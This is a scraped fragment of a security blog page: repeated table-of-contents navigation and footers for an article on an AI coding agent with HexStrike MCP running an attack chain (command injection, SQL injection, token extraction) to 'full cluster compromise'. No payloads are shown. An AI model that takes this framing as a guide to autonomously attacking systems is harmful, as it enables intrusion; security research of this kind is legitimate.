Discovery</a></li><li><a href="#stage-2-vulnerability-discovery" class="table-of-contents__link toc-highlight">Stage 2: Vulnerability Discovery</a></li><li><a href="#stage-3-token-validation-and-api-access" class="table-of-contents__link toc-highlight">Stage 3: Token Validation and API Access</a></li><li><a href="#stage-4-multiple-exploitation-methods" class="table-of-contents__link toc-highlight">Stage 4: Multiple Exploitation Methods</a></li><li><a href="#method-1-command-injection-multiple-payloads" class="table-of-contents__link toc-highlight">Method 1: Command Injection (Multiple Payloads)</a></li><li><a href="#method-2-sql-injection-multiple-techniques" class="table-of-contents__link toc-highlight">Method 2: SQL Injection (Multiple Techniques)</a></li><li><a href="#stage-5-cluster-enumeration" class="table-of-contents__link toc-highlight">Stage 5: Cluster Enumeration</a></li></ul></li><li><a href="#multiple-exploitation-methods" class="table-of-contents__link toc-highlight">Multiple Exploitation Methods</a><ul><li><a href="#ais-approach-to-finding-multiple-ways" class="table-of-contents__link toc-highlight">AI’s Approach to Finding Multiple Ways</a></li><li><a href="#token-extraction--3-methods-tested" class="table-of-contents__link toc-highlight">Token Extraction — 3 Methods Tested</a></li><li><a href="#command-injection--6-payloads-tested" class="table-of-contents__link toc-highlight">Command Injection — 6 Payloads Tested</a></li><li><a href="#sql-injection--2-techniques-tested" class="table-of-contents__link toc-highlight">SQL Injection — 2 Techniques Tested</a></li></ul></li><li><a href="#ai-troubleshooting" class="table-of-contents__link toc-highlight">AI Troubleshooting</a><ul><li><a href="#how-ai-handles-problems" class="table-of-contents__link toc-highlight">How AI Handles Problems</a></li><li><a href="#problem-1-tool-not-available" class="table-of-contents__link toc-highlight">Problem 1: Tool Not Available</a></li><li><a href="#problem-2-wordlist-not-found" class="table-of-contents__link toc-highlight">Problem 2: Wordlist Not Found</a></li><li><a href="#problem-3-sqlmap-interactive-prompt" class="table-of-contents__link toc-highlight">Problem 3: SQLMap Interactive Prompt</a></li><li><a href="#problem-4-file-naming-issues" class="table-of-contents__link toc-highlight">Problem 4: File Naming Issues</a></li></ul></li><li><a href="#complete-attack-chain" class="table-of-contents__link toc-highlight">Complete Attack Chain</a><ul><li><a href="#single-entry-point-to-full-compromise" class="table-of-contents__link toc-highlight">Single Entry Point to Full Compromise</a></li></ul></li><li><a href="#multiple-attack-vectors-discovered" class="table-of-contents__link toc-highlight">Multiple Attack Vectors Discovered</a></li><li><a href="#lessons-learned" class="table-of-contents__link toc-highlight">Lessons Learned</a></li><li><a href="#what-makes-this-approach-powerful" class="table-of-contents__link toc-highlight">What Makes This Approach Powerful</a><ul><li><a href="#key-ai-behaviors" class="table-of-contents__link toc-highlight">Key AI Behaviors</a></li><li><a href="#the-complete-prompt" class="table-of-contents__link toc-highlight">The Complete Prompt</a></li><li><a href="#what-the-user-actually-types" class="table-of-contents__link toc-highlight">What the User Actually Types</a></li></ul></li><li><a href="#what-the-ai-does" class="table-of-contents__link toc-highlight">What the AI Does</a></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a></li><li><a href="#the-power-of-ai--hexstrike-mcp" class="table-of-contents__link toc-highlight">The Power of AI + HexStrike MCP</a></li></ul></div></div></div></div></main></div></div></div><footer class="site-footer" data-site-shell="standalone" data-site-shell-version="2026-07-24.1"><div class="shared-footer-inner"><a class="shared-footer-brand" href="/"><img src="/assets/ap-logo.png" alt="" width="32" height="32" loading="lazy" decoding="async"><span><strong>Andrey Pautov</strong><small>Security research</small></span></a><nav class="shared-footer-links" aria-label="Footer navigation"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/projects.html">Products &amp; Labs</a><a href="/adversarygraph/">AdversaryGraph</a><a href="/about.html">About</a></nav><nav class="shared-footer-meta" aria-label="Site information"><a href="/privacy.html">Privacy / Data Handling</a><a href="/about.html#contact">Contact</a><a href="https://github.com/anpa1200" target="_blank" rel="noopener noreferrer">GitHub<span class="visually-hidden"> (opens in a new tab)</span><span aria-hidden="true"> ↗</span></a></nav></div><div class="shared-footer-bottom"><span>© <!-- -->2026<!-- --> Andrey Pautov · Original research and tooling</span><a href="#top" data-back-to-top="true">Back to top ↑</a></div></footer></div>
+<p><strong>Status</strong>: <strong>FULL CLUSTER COMPROMISE ACHIEVED</strong></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/medium-blog-navigation/docs/articles/2026/2026-02-04-my-lab-82d780962213"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">My lab:</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/medium-blog-navigation/docs/articles/2026/2026-02-05-warning-i-just-built-real-malware-by-using-just-human-language-prompts-8949628dee19"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">⚠️ WARNING: I Just Built Real Malware by using just human language prompts!</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ecosystem-fit" class="table-of-contents__link toc-highlight">Ecosystem Fit</a><ul><li><a href="#how-cursor--hexstrike-mcp-automatically-discovers-and-exploits-vulnerabilities-from-single-entry-point-to-full-cluster-compromise" class="table-of-contents__link toc-highlight">How Cursor + HexStrike MCP Automatically Discovers and Exploits Vulnerabilities. From single entry point to full cluster compromise</a></li></ul></li><li><a href="#executive-summary" class="table-of-contents__link toc-highlight">Executive Summary</a><ul><li><a href="#the-power-of-one-prompt" class="table-of-contents__link toc-highlight">The Power of One Prompt</a></li></ul></li><li><a href="#table-of-contents" class="table-of-contents__link toc-highlight">Table of Contents</a></li><li><a href="#the-single-prompt" class="table-of-contents__link toc-highlight">The Single Prompt</a><ul><li><a href="#the-initial-request" class="table-of-contents__link toc-highlight">The Initial Request</a></li></ul></li><li><a href="#ai-initial-analysis" class="table-of-contents__link toc-highlight">AI Initial Analysis</a></li><li><a href="#ai-reasoning-and-tool-selection" class="table-of-contents__link toc-highlight">AI Reasoning and Tool Selection</a><ul><li><a href="#how-ai-chooses-tools" class="table-of-contents__link toc-highlight">How AI Chooses Tools</a></li><li><a href="#example-network-reconnaissance" class="table-of-contents__link toc-highlight">Example: Network Reconnaissance</a></li></ul></li><li><a href="#stage-by-stage-execution" class="table-of-contents__link toc-highlight">Stage-by-Stage Execution</a><ul><li><a href="#stage-0-initial-reconnaissance" class="table-of-contents__link toc-highlight">Stage 0: Initial Reconnaissance</a></li><li><a href="#stage-1-service-discovery" class="table-of-contents__link toc-highlight">Stage 1: Service Discovery</a></li><li><a href="#stage-2-vulnerability-discovery" class="table-of-contents__link toc-highlight">Stage 2: Vulnerability Discovery</a></li><li><a href="#stage-3-token-validation-and-api-access" class="table-of-contents__link toc-highlight">Stage 3: Token Validation and API Access</a></li><li><a href="#stage-4-multiple-exploitation-methods" class="table-of-contents__link toc-highlight">Stage 4: Multiple Exploitation Methods</a></li><li><a href="#method-1-command-injection-multiple-payloads" class="table-of-contents__link toc-highlight">Method 1: Command Injection (Multiple Payloads)</a></li><li><a href="#method-2-sql-injection-multiple-techniques" class="table-of-contents__link toc-highlight">Method 2: SQL Injection (Multiple Techniques)</a></li><li><a href="#stage-5-cluster-enumeration" class="table-of-contents__link toc-highlight">Stage 5: Cluster Enumeration</a></li></ul></li><li><a href="#multiple-exploitation-methods" class="table-of-contents__link toc-highlight">Multiple Exploitation Methods</a><ul><li><a href="#ais-approach-to-finding-multiple-ways" class="table-of-contents__link toc-highlight">AI’s Approach to Finding Multiple Ways</a></li><li><a href="#token-extraction--3-methods-tested" class="table-of-contents__link toc-highlight">Token Extraction — 3 Methods Tested</a></li><li><a href="#command-injection--6-payloads-tested" class="table-of-contents__link toc-highlight">Command Injection — 6 Payloads Tested</a></li><li><a href="#sql-injection--2-techniques-tested" class="table-of-contents__link toc-highlight">SQL Injection — 2 Techniques Tested</a></li></ul></li><li><a href="#ai-troubleshooting" class="table-of-contents__link toc-highlight">AI Troubleshooting</a><ul><li><a href="#how-ai-handles-problems" class="table-of-contents__link toc-highlight">How AI Handles Problems</a></li><li><a href="#problem-1-tool-not-available" class="table-of-contents__link toc-highlight">Problem 1: Tool Not Available</a></li><li><a href="#problem-2-wordlist-not-found" class="table-of-contents__link toc-highlight">Problem 2: Wordlist Not Found</a></li><li><a href="#problem-3-sqlmap-interactive-prompt" class="table-of-contents__link toc-highlight">Problem 3: SQLMap Interactive Prompt</a></li><li><a href="#problem-4-file-naming-issues" class="table-of-contents__link toc-highlight">Problem 4: File Naming Issues</a></li></ul></li><li><a href="#complete-attack-chain" class="table-of-contents__link toc-highlight">Complete Attack Chain</a><ul><li><a href="#single-entry-point-to-full-compromise" class="table-of-contents__link toc-highlight">Single Entry Point to Full Compromise</a></li></ul></li><li><a href="#multiple-attack-vectors-discovered" class="table-of-contents__link toc-highlight">Multiple Attack Vectors Discovered</a></li><li><a href="#lessons-learned" class="table-of-contents__link toc-highlight">Lessons Learned</a></li><li><a href="#what-makes-this-approach-powerful" class="table-of-contents__link toc-highlight">What Makes This Approach Powerful</a><ul><li><a href="#key-ai-behaviors" class="table-of-contents__link toc-highlight">Key AI Behaviors</a></li><li><a href="#the-complete-prompt" class="table-of-contents__link toc-highlight">The Complete Prompt</a></li><li><a href="#what-the-user-actually-types" class="table-of-contents__link toc-highlight">What the User Actually Types</a></li></ul></li><li><a href="#what-the-ai-does" class="table-of-contents__link toc-highlight">What the AI Does</a></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a></li><li><a href="#the-power-of-ai--hexstrike-mcp" class="table-of-contents__link toc-highlight">The Power of AI + HexStrike MCP</a></li></ul></div></div></div></div></main></div></div></div><footer class="site-footer" data-site-shell="standalone" data-site-shell-version="2026-07-24.1"><div class="shared-footer-inner"><a class="shared-footer-brand" href="/"><img src="/assets/ap-logo.png" alt="" width="32" height="32" loading="lazy" decoding="async"><span><strong>Andrey Pautov</strong><small>Security research</small></span></a><nav class="shared-footer-links" aria-label="Footer navigation"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/projects.html">Products &amp; Labs</a><a href="/adversarygraph/">AdversaryGraph</a><a href="/about.html">About</a></nav><nav class="shared-footer-meta" aria-label="Site information"><a href="/privacy.html">Privacy / Data Handling</a><a href="/about.html#contact">Contact</a><a href="https://github.com/anpa1200" target="_blank" rel="noopener noreferrer">GitHub<span class="visually-hidden"> (opens in a new tab)</span><span aria-hidden="true"> ↗</span></a></nav></div><div class="shared-footer-bottom"><span>© <!-- -->2026<!-- --> Andrey Pautov · Original research and tooling</span><a href="#top" data-back-to-top="true">Back to top ↑</a></div></footer></div>
 </body>
 </html>
